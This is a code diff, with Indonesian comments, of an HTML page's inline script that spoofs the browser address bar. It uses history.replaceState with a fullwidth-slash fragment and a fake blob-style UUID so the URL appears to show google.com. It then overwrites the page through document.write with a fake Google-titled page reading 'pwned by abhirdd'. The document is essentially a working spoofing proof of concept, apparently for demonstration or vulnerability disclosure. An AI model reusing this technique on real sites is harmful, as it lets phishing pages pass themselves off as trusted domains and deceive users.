@@ -9,10 +9,23 @@
 
   <script>
     (function () {
-      // 1. Fragment untuk spoofing di address bar
+      // 1. Cek apakah ini halaman hasil refresh
+      // Jika URL sudah memiliki hash spoofing kita, jangan jalankan script lagi
+      if (window.location.hash.includes('google.com')) {
+        return; 
+      }
+
+      // 2. Generate UUID acak untuk mensimulasikan awalan "blob:"
+      // (Hasilnya akan terlihat seperti: 8b5c215e-4e32-4791-91af-0c68a84fcb02)
+      var fakeUuid = crypto.randomUUID ? crypto.randomUUID() : 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+          var r = Math.random() * 16 | 0, v = c == 'x' ? r : (r & 0x3 | 0x8);
+          return v.toString(16);
+      });
+
+      // 3. Fragment untuk spoofing di address bar
       var FRAGMENT = '#%EF%BC%8Fgoogle.com%EF%BC%8Fpwned-by-abhirdd';
 
-      // 2. Payload HTML palsu
+      // 4. Payload HTML palsu (Google Logo + Teks)
       var payload =
         '<!DOCTYPE html><html><head><meta charset="utf-8">' +
         '<title>google.com</title>' +
@@ -31,10 +44,12 @@
         
         '<h1 style="font-weight:normal;font-size:3rem;">pwned by abhirdd</h1></body></html>';
 
-      // 3. Ubah URL di address bar tanpa me-reload halaman
-      history.replaceState(null, '', FRAGMENT);
+      // 5. Ubah URL di address bar secara instan (Mensimulasikan Blob URL)
+      // Kita selipkan UUID acak ke dalam path atau query string
+      var newUrl = window.location.pathname + '?' + fakeUuid + FRAGMENT;
+      history.replaceState(null, '', newUrl);
 
-      // 4. Timpa isi halaman saat ini dengan payload HTML palsu
+      // 6. Timpa isi halaman (tanpa reload, jadi cepat dan mulus)
       document.open();
       document.write(payload);
       document.close();
